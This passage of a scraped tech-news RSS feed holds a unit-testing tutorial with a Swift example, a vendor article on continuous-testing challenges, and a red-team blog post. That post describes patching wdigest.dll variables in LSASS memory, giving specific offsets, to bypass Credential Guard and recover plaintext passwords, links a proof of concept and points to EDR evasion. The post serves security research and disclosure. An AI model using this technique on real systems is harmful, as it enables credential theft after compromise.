<p>Now, Is it possible to revamp once in every two or three years? The very obvious answer is a big NO! Now, what exactly went wrong? It could be the Bad software design,</p>
<ul>
<li>Giant beast classes</li>
<li>Modules are tightly coupled</li>
<li>No unit tests</li>
</ul>
<h3 id="no-unit-tests">No unit tests</h3>
<p>In this article, we are going to see only the consequences of not having unit tests and how we can prepare ourselves to write our first unit test. If you see, we might not face any of these problems while starting a new project from scratch. Everyone loves to work on a new project. As your application grows, your confidence level starts to dip down and you might not able to ship features as fast as you were. The codebase is becoming legacy very quickly without tests.</p>
<blockquote>
<p>"Legacy code is the code without tests" - Micheal Feathers in 'Working Effectively with Legacy code'.</p>
</blockquote>
<h4 id="excuse-me">Excuse me ☝️</h4>
<p>We find many excuses for not writing unit tests,</p>
<ul>
<li>Writing tests slows down the development process</li>
<li>Don't have enough time</li>
<li>Anyway, we need to do E2E testing (End to End)</li>
<li>Not sure what to test</li>
<li>Don't know how to write unit tests</li>
</ul>
<p>Well, these are misconceptions we have in our minds because we really don't understand what unit testing is for. If you're also the one finding these excuses, then it is time to understand what is unit testing and automation testing pyramid.</p>
<h4 id="what-is-unit-testing">What is unit testing?</h4>
<p>Unit Testing is a level of software testing where individual units/ components of software are tested. The purpose is to validate that each unit of the software performs as designed. A unit is the smallest testable part of any software. </p>
<h4 id="automation-testing-pyramid">Automation Testing Pyramid:</h4>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598184303373/MtdF5St73.png?auto=format&amp;q=60" alt="testpyramid.png">
If you notice, writing unit tests are cheaper and faster than E2E testing. Though, unit testing cannot replace E2E testing, unit testing holds the major importance in the pyramid space. Unit testing is the base of the test pyramid. As we know clearly that a weak base can topple down the entire building and software development is no exception. And that's when we are demanding to revamp. 
I cannot resist mentioning this funny dialogue(Tamil) by Vadivelu - that explains the weak basement quite well 🥴😂
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598188481226/hVrZpDYbR.png?auto=format&amp;q=60" alt="basement_weak-uh.png">
If you're still wondering that unit tests are not that prominent in SDLC, you must know the benefits of writing them.</p>
<h4 id="why-unit-tests">Why unit tests?</h4>
<p>Writing unit tests allows us,</p>
<ul>
<li>To Speed up the development process in the long run and deliver new features with better confidence (I know this is opposite to what I wrote in the excuses list)</li>
<li>To Refactor with confidence </li>
<li>To get Instant feedback, much faster than running the entire application and test visually every time</li>
<li>To keep the codebase maintainable. Remember that we may not be able to write effective unit tests on a codebase that is designed badly</li>
<li>To keep the various modules and components loosely coupled</li>
<li>Unit tests tell you how it behaves. Yes, it is a kind of passive documentation for your code</li>
<li>To debug the issues easily</li>
<li>Identify breaking changes in development stage itself</li>
</ul>
<h4 id="not-sure-what-to-test">Not sure what to test?</h4>
<p>Ideally, everything! But we aren't in the ideal world. While it is a good idea to aim for 100% code coverage, we might have some classes in our application that talk to External frameworks. Our objective for writing unit testing is not to test the external frameworks and that is the reason we should keep these classes as thin as possible. If your codebase doesn't have any tests and you're beginning to write, then I would recommend you start with the core feature of your application. Most often, it is not that easy to write effective tests on your core features. The chances are that they are the giant beast classes. In this case, You might want to do refactoring before writing tests. Remember, </p>
<blockquote>
<p>The more complex the class, the more you want to write tests. </p>
</blockquote>
<h4 id="how-to-write-unit-tests">How to write unit tests?</h4>
<p>AAA (Arrange, Act, Assert) is a popular pattern that suggests to divide the test method into 3 sections,</p>
<p>There are three steps we need to follow for every unit test,</p>
<ol>
<li><strong>Arrange:</strong> This section initializes objects and sets the value of the data that is passed to the method under test. This involves topics such as Test Doubles, Dependency Injection, etc</li>
<li><strong>Act:</strong> This section invokes the method under test with the arranged parameters</li>
<li><strong>Assert:</strong> This section verifies that the action of the method under test behaves as expected</li>
</ol>
<p>Consider we are testing the class <code>Stack</code>, You must have come across the term <strong><em>SUT</em></strong> which stands for 'System Under Test'. Well, in our case <code>Stack</code> is our SUT.</p>
<pre><code><span>final</span> <span><span>class</span> <span>StackTests</span>: <span>XCTestCase</span> </span>{

    <span>var</span> sut: <span>Stack</span>&lt;<span>String</span>&gt; = <span>Stack</span>()

    <span><span>func</span> <span>test_push</span><span>()</span></span> {
        
        sut = <span>Stack</span>()
        sut.push(<span>"Hello"</span>)

        
        sut.push(<span>"Reader"</span>)

        
        <span>XCTAssertTrue</span>(sut.top.data == <span>"Reader"</span>)
    }

    <span><span>func</span> <span>test_pop</span><span>()</span></span> {
        
        sut = <span>Stack</span>()
        sut.push(<span>"Hello"</span>)
        sut.push(<span>"Reader"</span>)

        
        sut.pop()

        
        <span>XCTAssertTrue</span>(sut.top.data == <span>"Hello"</span>)
    }
}
</code></pre><p>Yeah, we are now ready to kick start our unit testing journey, I mean it. Unit testing is not a destination but a continuous journey. As our application grows, we should keep writing tests. The more unit test coverage you have, the more benefit you get. Always remember that unit tests are first-class citizens in our project and they are equally important as our production source code. So it is important to plan and structure the unit test classes as well. I've chosen a simple example but when we start writing tests to our actual code, we may encounter problems in creating mocks for a complex class, testing asynchronous code, private methods, UI Components. I will cover a separate article to address the common problems in writing tests.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598211932437/JogyCZjQv.png?auto=format&amp;q=60" alt="unit-test-meme.png"></p>
<p>Thank you for reading this article! Let's start doing more of <code>CMD+U</code>(Test) than <code>CMD+R</code>(Run). </p>
<p>Happy coding!</p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.manivelnagarajan.com/unit-testing-the-freedom-to-fail-cke8l1tw70056ecs1923xcnwf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24279859</guid>
            <pubDate>Wed, 26 Aug 2020 06:54:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Common Challenges in Continuous Testing]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24279832">thread link</a>) | @AnuGeorge
<br/>
August 25, 2020 | https://testsigma.com/blog/common-challenges-in-continuous-testing/ | <a href="https://web.archive.org/web/*/https://testsigma.com/blog/common-challenges-in-continuous-testing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<h2><strong>Introduction</strong></h2>



<p>Continuous Testing is the process of testing at all stages of software development – one after the another- without any human intervention. <a href="https://testsigma.com/continuous-testing" target="_blank" rel="noopener noreferrer">Continuous Testing</a> is key to faster delivery of Agile products to the market. </p>



<p>Continuous Testing makes it possible to eliminate testing as a bottleneck for faster software development and delivery. But the path to achieving Continuous Testing has its own challenges, most common of which are mentioned below.</p>



<h2><strong>Common Challenges</strong></h2>



<p><strong>1. Lack of Testability Support in Products:</strong> A test automation system is a very basic requirement for Continuous Testing. To achieve strong automated testing for a product, you need to have almost all of your test cases automated. But does the product have the testability support required to automate all test cases? Not always! If products are not designed, keeping testability in mind, achieving continuous testing may become a distant dream.</p>



<p>Achieving continuous testing for new feature work done in legacy products becomes more difficult if the product didn’t have testability support initially. Adding testability support to such products is expensive and may not always get prioritized as compared to other items on the product roadmap, draining down the efforts for Continuous Testing.</p>



<p><strong>2. Lack of Standard Tools:</strong> For a variety of products, standard tools to achieve continuous testing don’t exist. Teams often resort to using in-house test automation tools or frameworks which are neither well-documented nor well-maintained. This adds to the woes of the testing team as they now have to struggle with the issues of the tool/framework also.</p>



<p>With in-house tools/frameworks, you have the benefit of code-ownership. You can make changes to the tool/framework to get desired behaviour, but that is a costly affair in terms of resources. You are now investing your resources to evolve the tool/framework rather than the product. Practically, teams don’t have the luxury to customize the testing tool/framework for their needs when they need to deliver a quality product on an impending timeline.</p>



<p><strong>3. Lack of Faster Feedback Loops:</strong> To leverage Continuous Testing, it is important to incorporate feedback on an on-going basis. To incorporate feedback on a continuous basis, you need feedback loops in the system that can help you gather feedback in real-time. Lack of such feedback loops introduce a delay in action, later affecting the quality of the product.</p>



<p>For example, if one of the test environments used to run automation tests is down, an alert message for the same helps you act timely to rectify it rather than digging into the cause of the non-arrival of the test report for scheduled test automation run.&nbsp;</p>



<p>Similarly, it helps to have a real-time dashboard for performance which depicts the performance metrics over a period of time rather than digging into logs and code-profiler reports every time you want to check on a product’s performance. When such dashboards are accessible to everyone on the team, it helps in bringing critical issues to the table and gets them prioritized.&nbsp;</p>



<p><strong>4. Lack of Testing Infrastructure:</strong> Often, organizations embark on the path of embracing Continuous Testing, without realizing the budgetary needs for it.</p>



<p>To implement Continuous Testing, you might need additional test environments that need to be maintained and kept up and running round the clock. You might also need advanced tools to incorporate faster feedback loops.&nbsp;</p>



<p>Although these costs aren’t significant as compared to the cost incurred due to the poor quality of the product, there is a need for organizational commitment. A half-way journey to continuous testing without adequate infrastructure only adds to the woes of the testing team and doesn’t help anyone.&nbsp;&nbsp;</p>



<p><strong>5. Lack of Enough Testers:</strong> Most product teams don’t have enough testers, which sometimes creates bottlenecks for achieving continuous testing. Continuous testing is an on-going journey and requires high initial investments in terms of setup, which may create extra workload for testers.</p>



<p>Until continuous testing reaches the stage where it can replace the need for traditional testing, testers are often caught in balancing the efforts required for switching to continuous testing and their regular testing tasks that usually have a high priority w.r.t product needs. This adds to the pending backlogs for achieving continuous testing, creating a chicken-and-egg situation, where continuous testing can reduce the testing time but there is no time to set up continuous testing.</p>



<p><strong>6. <a href="https://testsigma.com/blog/why-test-data-management-is-more-important-than-you-think/" target="_blank">Test Data Management</a>:</strong> Depending on the product and its testing needs, test data management sometimes becomes a bottleneck for continuous testing.</p>



<p>Test data when stored locally for testing environments may result in different versions of test data which may be difficult to maintain. Maintaining test data in a central repository and then accessing it from different test environments may ease this problem but may introduce other issues like network latency in tests.</p>



<p><strong>7. Increased Complexity:</strong> As the scope for the product grows, so does the scope for continuous testing.</p>



<p>With a large number of tests added to the system, it becomes a challenge to make the tests execute quickly. If tests take too long to run, it defeats the whole purpose of continuous testing as quick feedback is not available. If not all tests are run, it seems like a compromise on the quality of the product. Also, if not all tests are run, it makes the effort of adding all those tests to the system go in vain.</p>



<p><strong>8. Scalability Issues:</strong> Not all testing frameworks/tools may be suitable for scaling purposes.</p>



<p>Lack of support for large concurrent test sessions and slow test executions can become serious bottlenecks for your dream of achieving Continuous Testing.</p>



<p>Such scalability issues aren’t always noticeable in the beginning. They become clearly visible only after a significant amount of tests have been added to the system and the test system starts to get highly loaded. This makes the situation worse as at such a stage, it’s even more difficult to switch to a different tool/framework.</p>



<p><strong>9. Inefficient Processes:</strong> Sometimes, the processes followed in the team/organization are not conducive for achieving Continuous Testing. Let’s check:</p><p><strong>i. Change in Requirements:</strong> If requirement specifications keep on changing frequently, it creates a lot of rework for the team, especially the testing team as tests may need to be updated every time there is a change in the requirements. This may adversely impact the efforts for continuous testing.</p><p><strong>ii. Unclear Roles and Responsibilities of Team Members:</strong> If the roles and responsibilities of team members are not clearly defined, it may result in ambiguous ownership of tasks. Such ambiguity can lead to redundant efforts on some tasks and some tasks getting totally ignored. Clear ownership of tasks is important in achieving Continuous Testing.</p><p><strong>iii. Excluding Testing Team in Initial Discussions:</strong> If the testing team is not included in all product-related discussions from the beginning, it would create gaps in the understanding which may impact continuous testing. Also, it would require additional processes such as hand-offs from Developers to Testers from time to time, adding inefficiency to the whole system.&nbsp;</p><p><strong>iv. Bureaucratic Approvals:</strong> If your team/organization functions with heavy bureaucracy and approvals are needed for every small thing, it can add inefficiency to the whole system which can make it hard to achieve continuous testing.&nbsp;</p>



<p>For example, if a test environment has gone down and you don’t have the required access privileges to bring it back up and need to wait on some other team/person for this, it can lead to inefficiency in the continuous testing pipeline.&nbsp;</p>



<h2><strong>Suggestions for Resolving Some Common Challenges</strong></h2>



<p>Most of the common challenges discussed above can be worked around with the help of some suggestions discussed below.</p>



<p><strong>1. Include Testability from Beginning:</strong></p><p><strong>i. </strong>Testability should be part of the low-level design for the product.</p><p><strong>ii. </strong>Any feature developed for the product should not be considered complete unless it has the required testability support for Continuous Testing.</p>



<p><strong>2. Evaluate Tools/Frameworks before Including them in the System:</strong></p><p><strong>i. </strong>It’s good to evaluate any testing tool/framework for required support before getting bound to it by making it part of the system.</p><p><strong>ii. </strong>The right combination of open source and paid test frameworks/tools can be used rather than relying solely on open-source test frameworks/tools.</p><p><strong>iii. </strong>Having a defined set of parameters to capture results of experiments with new tools can help in a better evaluation of tools/frameworks in a much-organized way.</p>



<p><strong>3. Evaluate Budget Requirements before Embracing Continuous Testing:</strong> Implementing Continuous Testing may need a significant budget for test environments and tools/frameworks.</p>



<p>Evaluating budget requirements before starting on the path of Continuous Testing helps in making informed decisions early rather than being stuck in the middle of the path due to budgetary constraints.</p>



<p><strong>4. Leveraging Cloud-based Virtual Infrastructure:</strong> Cloud-based test environments can be made accessible instantaneously on demand. They also save testing teams from most of the headache associated with managing and maintaining traditional test environments. Leveraging cloud-based virtual environments can help resolve a lot of issues related to the availability of test environments for Continuous Testing.&nbsp;&nbsp;</p>



<p> Using test automation tools that support test automation workflows on the cloud can further add to these benefits. Testsigma is one such tool.</p>



<div>
<p><b>
Completely hosted on the cloud, Testsigma saves you from any installation and configuration issues. You are ready to start automating soon after signup.
</b></p>

</div>



<p><strong>5. Have Enough Testers:</strong> Continuous Testing is an on-going journey and testers are the major contributors to make this journey successful. …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://testsigma.com/blog/common-challenges-in-continuous-testing/">https://testsigma.com/blog/common-challenges-in-continuous-testing/</a></em></p>]]>
            </description>
            <link>https://testsigma.com/blog/common-challenges-in-continuous-testing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24279832</guid>
            <pubDate>Wed, 26 Aug 2020 06:47:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bypassing MS Credential Guard to recover plaintext credentials]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24279792">thread link</a>) | @a5withtrrs
<br/>
August 25, 2020 | https://teamhydra.blog/2020/08/25/bypassing-credential-guard/ | <a href="https://web.archive.org/web/*/https://teamhydra.blog/2020/08/25/bypassing-credential-guard/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-47">

	

	
	<div>
		
<p>In ye old days, a [hacker, red teamer, penetration tester, motivated child] would compromise a host, use an exploit to elevate or laterally move, and then Mimikatz their way to glory (ok, maybe not <em>just</em> in the old days).&nbsp; This is becoming increasingly more complicated to achieve.  Many new technologies have been implemented to prevent or restrict access to credentials on a compromised host.&nbsp; Last year, Adam Chester (@_xpn_) wrote an <a href="https://blog.xpnsec.com/exploring-mimikatz-part-1/">excellent blog post</a> on memory patching wdigest.dll to enable UseLogonCredentials.  This is done without dropping files to disk or changing registry keys.&nbsp; I will touch on this briefly, but I strongly recommend reading his post before reading through this.&nbsp;</p>



<p>After reading XPN’s post, myself and a co-worker started exploring other possibilities for bypassing / disabling protections using memory patching. &nbsp;Windows Defender Credential Guard seemed like an excellent target for this type of attack.</p>



<p><em>TL/DR &amp;&amp; (POC || GTFO)</em><br><em>Wdigest can be enabled on a system with Credential Guard by patching the values of g_fParameter_useLogonCredential and g_IsCredGuardEnabled in memory. <a href="https://gist.github.com/N4kedTurtle/8238f64d18932c7184faa2d0af2f1240" target="_blank" rel="noreferrer noopener">PoC located here</a>.</em></p>



<blockquote><p>“Introduced in Windows&nbsp;10 Enterprise and Windows Server 2016, Windows Defender Credential Guard uses virtualization-based security to isolate secrets so that only privileged system software can access them. Unauthorized access to these secrets can lead to credential theft attacks, such as Pass-the-Hash or Pass-The-Ticket. Windows Defender Credential Guard prevents these attacks by protecting NTLM password hashes, Kerberos Ticket Granting Tickets, and credentials stored by applications as domain credentials.” </p><cite><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard" rel="nofollow">https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard</a></cite></blockquote>



<p>Currently, the most common way to overcome Cred Guard is to register a new Security Support Provider (SSP) (<a href="https://twitter.com/gentilkiwi/status/1044715664823308289">Mimikatz memssp</a> or a custom one).&nbsp; This is generally loaded into memory and then captures and writes any credentials entered.&nbsp; This can <a href="https://blog.xpnsec.com/exploring-mimikatz-part-2/">be modified </a> (seriously, @_xpn_ is a beast) to improve opsec but we wanted to see if there was a simpler and hopefully less identifiable way to do this.</p>



<p>The first thing we should check is if we can just enable UseLogonCredential on a system with Credential Guard enabled.&nbsp; <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-protection-limits">Per MSDN</a>:</p>



<blockquote><p>“When Windows Defender Credential Guard is enabled, neither Digest nor CredSSP have access to users’ logon credentials. This implies no Single Sign-On use for these protocols.”</p></blockquote>



<p>This <em>suggests </em>that enabling UseLogonCredential on a system with Credential Guard will not have any impact on an attacker’s ability to get credentials from memory since Digest will not have access even if enabled.&nbsp; It still seems worth testing, just in case.</p>



<p>First, we identify the offset of g_fParameter_useLogonCredential.&nbsp; It should be noted that this will change between versions of wdigest.dll (but is static between systems with the same version).&nbsp; This can easily be done with any debugger.</p>



<figure><img data-attachment-id="50" data-permalink="https://teamhydra.blog/uselogoncred/" data-orig-file="https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png" data-orig-size="1016,309" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="uselogoncred" data-image-description="" data-medium-file="https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png?w=300" data-large-file="https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png?w=750" src="https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png?w=1016" alt="" srcset="https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png 1016w, https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png?w=150 150w, https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png?w=300 300w, https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png?w=768 768w" sizes="(max-width: 1016px) 100vw, 1016px"></figure>



<p>We can see wdigest!g_fParameter_useLogonCredential is 0x36124 bytes from the base of wdigest.dll (we are testing on Windows 10 Enterprise version 1909).&nbsp; With this information we can easily find and patch wdigest in memory on the host.</p>



<p>Let’s boot up our system and ensure that Credential Guard is enabled.</p>



<div><figure><img data-attachment-id="53" data-permalink="https://teamhydra.blog/cropped_credguardonsystem/" data-orig-file="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png" data-orig-size="1128,555" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cropped_credguardonsystem" data-image-description="" data-medium-file="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png?w=300" data-large-file="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png?w=750" src="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png?w=1024" alt="" srcset="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png?w=1024 1024w, https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png?w=150 150w, https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png?w=300 300w, https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png?w=768 768w, https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png 1128w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>



<p>Now, run our PoC that patches UseLogonCredential.</p>



<div><figure><img data-attachment-id="54" data-permalink="https://teamhydra.blog/cropped_patchlogoncredentials/" data-orig-file="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_patchlogoncredentials.png" data-orig-size="568,181" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cropped_patchlogoncredentials" data-image-description="" data-medium-file="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_patchlogoncredentials.png?w=300" data-large-file="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_patchlogoncredentials.png?w=568" src="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_patchlogoncredentials.png?w=568" alt="" srcset="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_patchlogoncredentials.png 568w, https://teamhydradotblog.files.wordpress.com/2020/08/cropped_patchlogoncredentials.png?w=150 150w, https://teamhydradotblog.files.wordpress.com/2020/08/cropped_patchlogoncredentials.png?w=300 300w" sizes="(max-width: 568px) 100vw, 568px"></figure></div>



<p>Finally, log in with a new user and see if we got credentials…..</p>



<div><figure><img data-attachment-id="55" data-permalink="https://teamhydra.blog/failed_mimi/" data-orig-file="https://teamhydradotblog.files.wordpress.com/2020/08/failed_mimi.png" data-orig-size="442,132" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="failed_mimi" data-image-description="" data-medium-file="https://teamhydradotblog.files.wordpress.com/2020/08/failed_mimi.png?w=300" data-large-file="https://teamhydradotblog.files.wordpress.com/2020/08/failed_mimi.png?w=442" src="https://teamhydradotblog.files.wordpress.com/2020/08/failed_mimi.png?w=442" alt="" srcset="https://teamhydradotblog.files.wordpress.com/2020/08/failed_mimi.png 442w, https://teamhydradotblog.files.wordpress.com/2020/08/failed_mimi.png?w=150 150w, https://teamhydradotblog.files.wordpress.com/2020/08/failed_mimi.png?w=300 300w" sizes="(max-width: 442px) 100vw, 442px"></figure></div>



<p>Unsurprisingly, we are still unable to get new credentials.&nbsp; However, it seems like there may be more here to investigate, so we return to looking at wdigest.dll and see what other variables exist that could be of interest to us.</p>



<div><figure><img data-attachment-id="57" data-permalink="https://teamhydra.blog/globalvars/" data-orig-file="https://teamhydradotblog.files.wordpress.com/2020/08/globalvars.png" data-orig-size="696,647" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="globalvars" data-image-description="" data-medium-file="https://teamhydradotblog.files.wordpress.com/2020/08/globalvars.png?w=300" data-large-file="https://teamhydradotblog.files.wordpress.com/2020/08/globalvars.png?w=696" src="https://teamhydradotblog.files.wordpress.com/2020/08/globalvars.png?w=696" alt="" srcset="https://teamhydradotblog.files.wordpress.com/2020/08/globalvars.png 696w, https://teamhydradotblog.files.wordpress.com/2020/08/globalvars.png?w=150 150w, https://teamhydradotblog.files.wordpress.com/2020/08/globalvars.png?w=300 300w" sizes="(max-width: 696px) 100vw, 696px"></figure></div>



<p>g_IsCredGuardEnabled is set to 1 when Cred Guard is enabled on a system.&nbsp; Unsetting this value seems to be worth trying.</p>



<p>&nbsp;Using the same technique as we used previously to get the offset to UseLogonCredential, we find the offset for g_IsCredGuardEnabled (here it is 0x35b88) and patch. &nbsp;Sadly, setting this value to 0 seemed to have no impact on anything relevant to our purposes.&nbsp; It turns out that the SpAcceptCredentials function in wdigest.dll checks both UseLogonCredential and IsCredGuardEnabled values to determine how to handle caching credentials. (We noticed later that XPN pointed out this value in his blog, but never goes farther into it).</p>



<p>So, what happens when we patch wdigest to enable UseLogonCredentials and unset IsCredGuardEnabled?&nbsp;</p>



<div><figure><img data-attachment-id="60" data-permalink="https://teamhydra.blog/credguardbypass_exe_final/" data-orig-file="https://teamhydradotblog.files.wordpress.com/2020/08/credguardbypass_exe_final.png" data-orig-size="631,223" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="credguardbypass_exe_final" data-image-description="" data-medium-file="https://teamhydradotblog.files.wordpress.com/2020/08/credguardbypass_exe_final.png?w=300" data-large-file="https://teamhydradotblog.files.wordpress.com/2020/08/credguardbypass_exe_final.png?w=631" src="https://teamhydradotblog.files.wordpress.com/2020/08/credguardbypass_exe_final.png?w=631" alt="" srcset="https://teamhydradotblog.files.wordpress.com/2020/08/credguardbypass_exe_final.png 631w, https://teamhydradotblog.files.wordpress.com/2020/08/credguardbypass_exe_final.png?w=150 150w, https://teamhydradotblog.files.wordpress.com/2020/08/credguardbypass_exe_final.png?w=300 300w" sizes="(max-width: 631px) 100vw, 631px"></figure></div>



<p>And now after we log in with a new session….</p>



<div><figure><img data-attachment-id="58" data-permalink="https://teamhydra.blog/final_after-fullbypass-cat_-password-plaintext/" data-orig-file="https://teamhydradotblog.files.wordpress.com/2020/08/final_after.fullbypass.cat_.password.plaintext.png" data-orig-size="777,228" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="final_after.fullbypass.cat_.password.plaintext" data-image-description="" data-medium-file="https://teamhydradotblog.files.wordpress.com/2020/08/final_after.fullbypass.cat_.password.plaintext.png?w=300" data-large-file="https://teamhydradotblog.files.wordpress.com/2020/08/final_after.fullbypass.cat_.password.plaintext.png?w=750" src="https://teamhydradotblog.files.wordpress.com/2020/08/final_after.fullbypass.cat_.password.plaintext.png" alt=""></figure></div>



<p>Clear text credentials!&nbsp; Note, this is NOT disabling Credential Guard but instead circumventing it by enabling wdigest.</p>



<p>As Credential Guard exists explicitly to help prevent elevated attackers from obtaining credentials from LSASS I reported this to Microsoft on principle.</p>



<p>Their response:</p>



<p>“After investigating this issue, we do not believe this is a Credential Guard bypass. Credential Guard is meant to protect credentials that were cached while the feature is enabled. If a privileged user disables Credential Guard, then the feature cannot protect subsequent logons. We’ll update our public documentation to clarify this behavior”</p>



<p>Given this response, I suspect this will be a reliable method of gaining clear text credentials on systems with Credential Guard enabled for the foreseeable future.</p>



<p>Memory patching host-based defenses has become a major aspect of modern red teaming.&nbsp; It is used to bypass AMSI, disable ETW, blind EDRs, and get cleartext credentials.&nbsp; This is just one more minor addition to the application of this type of technique. &nbsp;Hopefully posts like this will lead to increased visibility and better mitigation for this type of post-compromise action.</p>



<p>OPERATIONAL CONSIDERATIONS</p>



<p>The PoC provided IS NOT OPSEC SAFE.&nbsp; It is meant to demonstrate the concept.&nbsp; One of the biggest issues with this technique is that you are interacting directly with LSASS which is often looked for by EDRs (especially WriteProcessMemory).&nbsp; There have been many great posts about overcoming some of these hurdles (<a href="https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6">unhooking</a> and using <a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/">direct syscalls</a>) but I leave it to you to pursue implementing this technique operationally.</p>



<p>DETECTION AND PREVENTION</p>



<p>Not much to say here that hasn’t been said before.&nbsp; Monitoring LSASS, limiting administrators, network segmentation, all the usual suspects apply.&nbsp; A motivated and knowledgeable adversary that gains SYSTEM on a machine in your network will probably be able to accomplish what they need to on THAT system.&nbsp; The goal is to increase the cost in time, effort, and tooling to achieve that goal thus making your network less appealing as a target and increasing opportunities for detection and response. </p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article><!-- #post-${ID} -->

<!-- #comments -->

		</main><!-- #main -->
	</section><!-- #primary -->


